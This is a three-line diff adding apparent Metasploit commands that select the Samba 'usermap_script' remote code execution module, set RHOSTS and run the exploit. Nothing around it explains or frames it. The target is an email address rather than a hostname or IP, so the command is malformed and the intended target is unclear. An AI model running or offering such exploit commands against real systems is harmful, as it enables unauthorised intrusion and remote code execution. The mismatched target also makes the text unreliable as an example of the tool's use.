@@ -1,0 +1,3 @@
+use exploit/multi/samba/usermap_script
+set RHOSTS jaysnnbrgov@gmail.com
+exploit
